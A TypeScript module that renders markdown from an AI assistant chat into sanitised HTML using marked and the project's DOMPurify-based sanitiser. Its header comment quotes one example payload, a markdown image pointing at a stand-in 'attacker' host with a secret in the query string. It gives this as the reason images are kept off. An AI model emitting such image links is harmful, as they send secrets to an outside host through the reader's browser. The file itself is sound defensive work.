/**
 * Markdown rendering for the AI assistant chat.
 *
 * Pipeline: marked.parse(text) → DOMPurify (via sanitizeRichtext) → safe HTML.
 * The chat displays text from Claude (and the user's own input), and Claude's
 * responses regularly contain markdown — bold, lists, inline code, links.
 *
 * Sanitisation uses the project's existing `sanitizeRichtext`, which is
 * already configured with safe-by-default tags + a hook that rewrites every
 * <a> to `target="_blank" rel="noopener noreferrer"`. It stays on the
 * image-free default profile, not `RICHTEXT_CONTENT_CONFIG`: a model response
 * carrying `![x](https://attacker/?d=secret)` must not become a live <img>
 * the admin browser fetches.
 *
 * Streaming: this helper is called per text block on every render. `marked`
 * handles partial input gracefully (an unfinished `**` simply renders as
 * literal characters), so the live-streaming text is safe to re-parse on
 * each frame.
 */

import { marked } from 'marked'
import { sanitizeRichtext } from '@core/sanitize'

// Configure once at module load. `breaks: true` turns single newlines into
// <br> (chat rendering — feels more like the source); `gfm: true` enables
// the standard GitHub-flavoured Markdown features (tables would be allowed
// in marked but get stripped by sanitize, which is fine for now).
marked.use({ breaks: true, gfm: true })

/**
 * Parse `text` as markdown and return sanitised HTML safe to inject via
 * `dangerouslySetInnerHTML`. Returns an empty string for empty input or on
 * any parse failure.
 */
export function renderMarkdownToHtml(text: string): string {
  if (!text.trim()) return ''
  try {
    // `async: false` forces marked to return synchronously (it can be async
    // when extensions are registered).
    const html = marked.parse(text, { async: false }) as string
    return sanitizeRichtext(html)
  } catch {
    // Fallback: render the raw text as sanitised plain text rather than
    // crashing the chat bubble.
    return sanitizeRichtext(text)
  }
}
